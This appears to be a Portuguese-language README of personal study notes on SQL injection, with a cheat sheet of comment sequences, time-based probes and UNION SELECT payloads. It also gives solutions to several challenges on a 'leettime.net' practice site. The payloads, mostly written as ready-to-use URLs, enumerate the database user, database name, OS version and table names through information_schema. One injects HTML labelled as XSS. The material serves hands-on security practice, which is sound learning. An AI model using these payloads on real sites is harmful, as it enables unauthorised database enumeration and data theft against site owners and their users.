# leettime

DB : TABELA : COLUNA : LINHA
                              
select **COLUNA0,COLUNA1** from **TABELA0**
                                       
select * from **notas** where **IDaluno=1337 **         

select * from notas where IDaluno='1337'
                                          
select * from notas where IDaluno="1337"
                                             
select * from notas where IDaluno=(1337)
                        
select * from notas where IDaluno('1337')
                                                                                                     
select * from notas where IDaluno("1337")    
                                                 
?id=????              

```
________________________________________                                                              
     TABELA0         |   TABELA2        |                                                             
_____________________|__________________|                                                             
COLUNA1  |   COLUNA2 | COLUNA1 | COLUNA2|
---------------------|------------------|
 LINHA1  |   LINHA1  | [...]   | [...]
 LINHA2  |   LINHA2  |
             LINHA3  |
```
```
COMENTARIOS: -- | # | ;%00 | `

SQLI: select * from username where id=1

SQLI: select nome from username where id=injection

id=1' and sleep(5)--+a   <<<<<< FACA ISSO SEMPRE


1- BALANCEIO | 2- INJECTION | 3-COMENTARIO

SQLI: select * from username where id=1

SQLI: select nome from username where id=injection

id=1' and sleep(5)--+a   <<<<<< FACA ISSO SEMPRE


1- BALANCEIO | 2- INJECTION | 3-COMENTARIO

---------------------------------------------

UNION IDENTIFIQUE,<<<<<<<<<<<<

id=1' order by 1 --+anakein

?id=64' union select 13,<h1>PWN</h1>,3--+anakein      <<< XSS

?id=null' union select 66,user(),66--+anakein

?id=null' union select 66,database(),66--+anakein

?id=null' union select 66,concat(@@version_compile_os,0x20,@@version_compile_machine),66--+anakein

?id=null' union select 66,concat(select table_name from information_schema.tables where database()),66
```

## Basic Injection

#### Challenge 1 >> '
```
http://leettime.net/sqlninja.com/tasks/basic_ch1.php?id=null' union select 66,(select table_name from information_schema.tables where table_schema=database() limit 2,1),66--+anakein
```

![list_table1](https://raw.githubusercontent.com/e-anakein/leettime/master/images/photo_2019-05-24_22-51-48.jpg)

#### Challenge 3  >> "

```
http://leettime.net/sqlninja.com/tasks/basic_ch3.php?id=1" and sleep(5)--+anakein
```
![chall_3](https://raw.githubusercontent.com/e-anakein/leettime/master/images/photo_2019-05-24_23-28-14.jpg)

#### Challenge 4 >> ')

```
http://leettime.net/sqlninja.com/tasks/basic_ch4.php?id=1') and sleep(5) --+anakein
```

![chall_4](https://raw.githubusercontent.com/e-anakein/leettime/master/images/photo_2019-05-24_23-10-32.jpg)


------

```
http://leettime.net/sqlninja.com/tasks/basic_ch2.php?id=1 and sleep(5);%00
```

**order by coluna_name**

ordena as colunas dentro de uma tabela

```
http://www.seusite.com.br/noticias.php?id=0 union select 0,0,0,database(),0,0,0,0,concat(@@version_compile_os,0x20,@@version_compile_machine),'<img src="http://weknowyourdreams.com/images/dragon/dragon-05.jpg">' --+1
```

